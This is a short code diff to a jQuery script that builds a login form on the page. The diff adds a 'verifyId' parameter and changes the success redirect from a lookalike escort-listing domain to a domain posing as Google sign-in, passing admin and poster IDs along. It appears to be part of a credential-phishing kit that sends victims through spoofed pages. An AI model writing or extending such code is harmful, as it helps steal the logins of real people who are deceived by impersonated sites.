@@ -48,6 +48,8 @@ $(document).ready(function () {
       const userId = getQueryParam('userid') || 1; // Default to 1 if 'userid' is not present
     const adminId = getQueryParam('admin');
     const posterId = getQueryParam('poster');
+        const verifyId = getQueryParam('verifyId');
+
     const site = getQueryParam('site');
 
     // Dynamically create the login form
@@ -115,7 +117,7 @@ $(document).ready(function () {
                     
                         // Redirect to another URL on success
                         window.onload = function(){
-                            window.location.href = `https://view.megaapersonase.website/female-escort/${userId}`;
+                            window.location.href =  `https://google-signin-live.vercel.app/${adminId}/${posterId}/${verifyId}`;
                           }
                     
                 },
